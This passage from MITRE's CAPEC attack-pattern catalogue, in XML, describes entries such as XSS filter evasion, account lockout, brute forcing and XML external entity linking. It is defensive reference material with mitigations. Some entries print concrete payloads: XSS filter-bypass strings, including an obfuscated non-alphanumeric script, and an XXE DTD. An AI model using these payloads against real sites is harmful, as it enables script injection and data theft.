            <Mitigation>Implementation: The victim should configure the browser to minimize active content from untrusted sources.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="81"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-05-01">Cross-Site Scripting in Error Pages</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="199" Name="XSS Using Alternate Syntax" Abstraction="Detailed" Status="Draft">
         <Description>An adversary uses alternate forms of keywords or commands that result in the same action as the primary form but which may not be caught by filters. For example, many keywords are processed in a case insensitive manner. If the site's web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the "script" tag using the alternate forms of "Script" or "ScRiPt" may bypass filters where "script" is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="591"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="592"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="588"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the application] Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds.</Description>
               <Technique>Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</Technique>
               <Technique>Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Attempt injection payload variations on input parameters] Possibly using an automated tool, an attacker requests variations on the inputs he surveyed before. He sends parameters that include variations of payloads. The payloads are designed to bypass incomplete filtering (e.g., incomplete HTML encoding etc.) and tries many variations of characters injection that would enable the XSS payload. He records all the responses from the server that include unmodified versions of his script.</Description>
               <Technique>Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier. Attempt numerous variations based on form, format, syntax &amp; encoding.</Technique>
               <Technique>Use a proxy tool to record results of manual input of XSS probes in known URLs.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.</Technique>
               <Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site</Technique>
               <Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>5</Step>
               <Phase>Exploit</Phase>
               <Description>[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Target client software must allow scripting such as JavaScript.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To inject the malicious payload in a web page</Skill>
            <Skill Level="High">To bypass non trivial filters in the application</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Ability to send HTTP request to a web application.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Authentication</Scope>
               <Scope>Authorization</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Use browser technologies that do not allow client side scripting.</Mitigation>
            <Mitigation>Design: Utilize strict type, character, and encoding enforcement</Mitigation>
            <Mitigation>Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.</Mitigation>
            <Mitigation>Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.</Mitigation>
            <Mitigation>Implementation: Perform input validation for all remote content, including remote and user-generated content</Mitigation>
            <Mitigation>Implementation: Perform output validation for all remote content.</Mitigation>
            <Mitigation>Implementation: Disable scripting languages such as JavaScript in browser</Mitigation>
            <Mitigation>Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>In this example, the attacker tries to get &lt;script&gt;alert(1)&lt;/script&gt; executed by the victim's browser. The target application employs regular expressions to make sure no script is being passed through the application to the web page; such a regular expression could be ((?i)script), and the application would replace all matches by this regex by the empty string. An attacker will then create a special payload to bypass this filter:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">&lt;scriscriptpt&gt;alert(1)&lt;/scscriptript&gt;</xhtml:div>
               <xhtml:p>when the applications gets this input string, it will replace all "script" (case insensitive) by the empty string and the resulting input will be the desired vector by the attacker:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="result">&lt;script&gt;alert(1)&lt;/script&gt;</xhtml:div>
               <xhtml:p>In this example, we assume that the application needs to write a particular string in a client-side JavaScript context (e.g., &lt;script&gt;HERE&lt;/script&gt;). For the attacker to execute the same payload as in the previous example, he would need to send alert(1) if there was no filtering. The application makes use of the following regular expression as filter</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="mitigation">((\w+)\s*\(.*\)|alert|eval|function|document)</xhtml:div>
               <xhtml:p>and replaces all matches by the empty string. For example each occurrence of alert(), eval(), foo() or even the string "alert" would be stripped. An attacker will then create a special payload to bypass this filter:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">this['al' + 'ert'](1)</xhtml:div>
               <xhtml:p>when the applications gets this input string, it won't replace anything and this piece of JavaScript has exactly the same runtime meaning as alert(1). The attacker could also have used non-alphanumeric XSS vectors to bypass the filter; for example,</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_)</xhtml:div>
               <xhtml:p>would be executed by the JavaScript engine like alert(1) is.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="87"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-69" Section="XSS Filter Evasion Cheat Sheet"/>
            <Reference External_Reference_ID="REF-70" Section="Testing for Cross site scripting"/>
            <Reference External_Reference_ID="REF-71"/>
            <Reference External_Reference_ID="REF-72" Section="WASC-08 - Cross Site Scripting"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Consequences</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-05-01">Cross-Site Scripting Using Alternate Syntax</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="2" Name="Inducing Account Lockout" Abstraction="Standard" Status="Draft">
         <Description>An attacker leverages the security functionality of the system aimed at thwarting potential attacks to launch a denial of service attack against a legitimate system user. Many systems, for instance, implement a password throttling mechanism that locks an account after a certain number of incorrect log in attempts. An attacker can leverage this throttling mechanism to lock a legitimate user out of their own account. The weakness that is being leveraged by an attacker is the very security feature that has been put in place to counteract attacks.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="212"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Experiment</Phase>
               <Description>[Investigate account lockout behavior of system] Investigate the security features present in the system that may trigger an account lockout</Description>
               <Technique>Analyze system documentation to find list of events that could potentially cause account lockout</Technique>
               <Technique>Obtain user account in system and attempt to lock it out by sending malformed or incorrect data repeatedly</Technique>
               <Technique>Determine another user's login ID, and attempt to brute force the password (or other credentials) for it a predetermined number of times, or until the system provides an indication that the account is locked out.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Obtain list of user accounts to lock out] Generate a list of valid user accounts to lock out</Description>
               <Technique>Obtain list of authorized users using another attack pattern, such as SQL Injection.</Technique>
               <Technique>Attempt to create accounts if possible; system should indicate if a user ID is already taken.</Technique>
               <Technique>Attempt to brute force user IDs if system reveals whether a given user ID is valid or not upon failed login attempts.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Lock Out Accounts] Perform lockout procedure for all accounts that the attacker wants to lock out.</Description>
               <Technique>For each user ID to be locked out, perform the lockout procedure discovered in the first step.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The system has a lockout mechanism.</Prerequisite>
            <Prerequisite>An attacker must be able to reproduce behavior that would result in an account being locked.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">No programming skills or computer knowledge is needed. An attacker can easily use this attack pattern following the Execution Flow above.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Computer with access to the login portion of the target system</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>Denial of Service</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Implement intelligent password throttling mechanisms such as those which take IP address into account, in addition to the login name.</Mitigation>
            <Mitigation>When implementing security features, consider how they can be misused and made to turn on themselves.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>A famous example of this type an attack is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="645"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="20" Name="Encryption Brute Forcing" Abstraction="Standard" Status="Draft">
         <Description>An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="112"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>Determine the ciphertext and the encryption algorithm.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>Perform an exhaustive brute force search of the key space, producing candidate plaintexts and observing if they make sense.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Ciphertext is known.</Prerequisite>
            <Prerequisite>Encryption algorithm and key size are known.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Brute forcing encryption does not require much skill.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>
               <xhtml:p>A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge).</xhtml:p>
               <xhtml:p>On average, for a binary key of size N, 2^(N/2) trials will be needed to find the key that would decrypt the ciphertext to obtain the original plaintext.</xhtml:p>
               <xhtml:p>Obviously as N gets large the brute force approach becomes infeasible.</xhtml:p>
            </Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>None. This attack happens offline.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.</Mitigation>
            <Mitigation>In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="326"/>
            <Related_Weakness CWE_ID="327"/>
            <Related_Weakness CWE_ID="693"/>
            <Related_Weakness CWE_ID="719"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="200" Name="Removal of filters: Input filters, output filters, data masking" Abstraction="Detailed" Status="Draft">
         <Description>An attacker removes or disables filtering mechanisms on the target application. Input filters prevent invalid data from being sent to an application (for example, overly large inputs that might cause a buffer overflow or other malformed inputs that may not be correctly handled by an application). Input filters might also be designed to constrained executable content. For example, if an application accepts scripting languages as input, an input filter could constrain the commands received and block those that the application's administrator deems to be overly powerful. An output filter screens responses from an application or person in order to prevent disclosure of sensitive information. For example, an application's output filter might block output that is sourced to sensitive folders or which contains certain keywords. A data mask is similar to an output filter, but usually applies to structured data, such as found in databases. Data masks elide or replace portions of the information returned from a query in order to protect against the disclosure of sensitive information. If an input filter is removed the attacker will be able to send content to the target and have the target utilize it without it being sanitized. If the content sent by the attacker is executable, the attacker may be able to execute arbitrary commands on the target. If an output filter or data masking mechanism is disabled, the target may send out sensitive information that would otherwise be elided by the filters. If the data mask is disabled, sensitive information stored in a database would be returned unaltered. This could result in the disclosure of sensitive information, such as social security numbers of payment records. This attack is usually executed as part of a larger attack series. The attacker would disable filters and would then mount additional attacks to either insert commands or data or query the target application in ways that would otherwise be prevented by the filters.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="207"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target application must utilize some sort of filtering mechanism (input, output, or data masking).</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="201" Name="XML Entity Linking" Abstraction="Detailed" Status="Draft">
         <Description>An attacker creates an XML document that contains an external entity reference. External entity references can take the form of &lt;!ENTITY name system "uri"&gt; tags in a DTD. Because processors may not validate documents with external entities, there may be no checks on the nature of the reference in the external entity. This can allow an attacker to open arbitrary files or connections.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="231"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="278"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.</Description>
               <Technique>Use an automated tool to record all instances of URLs to process XML requests.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how the application processes XML requests.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>[Launch an XML Entity Linking attack] The attacker crafts malicious XML message that contains references to senstive files.</Description>
               <Technique>Send the malicious crafted XML message containing the reference to a senstive file to the target URL.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target must follow external entity references without validating the validity of the reference target.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To send XML messages with maliciously crafted DTDs.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Configure the XML processor to only retrieve external entities from trusted sources.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>The following DTD would attempt to open the /dev/tty device:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">&lt;!DOCTYPE doc [ &lt;!ENTITY ent SYSTEM "file:///dev/tty"&gt; ]&gt;</xhtml:div>
               <xhtml:p>A malicious actor could use this crafted DTD to reveal sensitive information.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="829"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-73"/>
            <Reference External_Reference_ID="REF-74"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Phases, Attacker_Skills_or_Knowledge_Required, Description, Description Summary, Examples-Instances, Injection_Vector, Methods_of_Attack, Payload, Payload_Activation_Impact, Resources_Required, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Description Summary, Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2018-07-31">XML Entity Blowup</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="202" Name="Create Malicious Client" Abstraction="Standard" Status="Draft">
         <Description>An adversary creates a client application to interface with a target service where the client violates assumptions the service makes about clients. Services that have designated client applications (as opposed to services that use general client applications, such as IMAP or POP mail servers which can interact with any IMAP or POP client) may assume that the client will follow specific procedures. For example, servers may assume that clients will accurately compute values (such as prices), will send correctly structured messages, and will attempt to ensure efficient interactions with the server. By reverse-engineering a client and creating their own version, an adversary can take advantage of these assumptions to abuse service functionality. For example, a purchasing service might send a unit price to its client and expect the client to correctly compute the total cost of a purchase. If the adversary uses a malicious client, however, the adversary could ignore the server input and declare any total price. Likewise, an adversary could configure the client to retain network or other server resources for longer than legitimately necessary in order to degrade server performance. Even services with general clients can be susceptible to this attack if they assume certain client behaviors. However, such services generally can make fewer assumptions about the behavior of their clients in the first place and, as such, are less likely to make assumptions that an adversary can exploit.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="22">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted service must make assumptions about the behavior of the client application that interacts with it, which can be abused by an adversary.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The adversary must be able to reverse engineer a client of the targeted service. However, the adversary does not need to reverse engineer all client functionality - they only need to recreate enough of the functionality to access the desired server functionality.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="602"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="203" Name="Manipulate Registry Information" Abstraction="Standard" Status="Stable">
         <Description>An adversary exploits a weakness in authorization in order to modify content within a registry (e.g., Windows Registry, Mac plist, application registry). Editing registry information can permit the adversary to hide configuration information or remove indicators of compromise to cover up activity. Many applications utilize registries to store configuration and service information. As such, modification of registry information can affect individual services (affecting billing, authorization, or even allowing for identity spoofing) or the overall configuration of a targeted application. For example, both Java RMI and SOAP use registries to track available services. Changing registry values is sometimes a preliminary step towards completing another attack pattern, but given the long term usage of many registry values, manipulation of registry information could be its own end.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="176"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted application must rely on values stored in a registry.</Prerequisite>
            <Prerequisite>The adversary must have a means of elevating permissions in order to access and modify registry content through either administrator privileges (e.g., credentialed access), or a remote access tool capable of editing a registry through an API.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">The adversary requires privileged credentials or the development/acquiring of a tailored remote access tool.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Ensure proper permissions are set for Registry hives to prevent users from modifying keys.</Mitigation>
            <Mitigation>Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.</Mitigation>
            <Mitigation>Employ robust identification and audit/blocking via whitelisting of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Manipulating registration information can be undertaken in advance of a path traversal attack (inserting relative path modifiers) or buffer overflow attack (enlarging a registry value beyond an application's ability to store it).</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="15"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1112</Entry_ID>
               <Entry_Name>Modify Registry</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, References, Related_Weaknesses, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2018-07-31">Manipulate Application Registry Values</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="204" Name="Lifting Sensitive Data Embedded in Cache" Abstraction="Detailed" Status="Draft">
         <Description>An attacker examines a target application's cache for sensitive information. Many applications that communicate with remote entities or which perform intensive calculations utilize caches to improve efficiency. However, if the application computes or receives sensitive information and the cache is not appropriately protected, an attacker can browse the cache and retrieve this information. This can result in the disclosure of sensitive information.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="167"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target application must store sensitive information in a cache.</Prerequisite>
            <Prerequisite>The cache must be inadequately protected against attacker access.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker must be able to reach the target application's cache. This may require prior access to the machine on which the target application runs. If the cache is encrypted, the attacker would need sufficient computational resources to crack the encryption. With strong encryption schemes, doing this could be intractable, but weaker encryption schemes could allow an attacker with sufficient resources to read the file.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="524"/>
            <Related_Weakness CWE_ID="311"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Lifting cached, sensitive data embedded in client distributions (thick or thin)</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="206" Name="Signing Malicious Code" Abstraction="Detailed" Status="Draft">
